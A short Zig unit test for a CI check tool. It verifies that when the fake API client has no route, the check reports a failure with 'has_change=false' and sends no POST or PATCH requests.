test "check: an API call that fails outright (no answer at all) is a failure with has_change=false, never a skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    // No route for the repository: the fake raises an error where a real client would on a dead connection.
    env.fake.routes.clearRetainingCapacity();
    const r = runCheck(&env);
    try t.expectEqual(@as(u8, 1), r.code);
    try t.expect(kit.contains(r.err, "NoRoute"));
    try t.expectEqualStrings("has_change=false\n", env.h.read("gh_out"));
    try t.expectEqual(@as(usize, 0), env.fake.count(.POST) + env.fake.count(.PATCH));
}
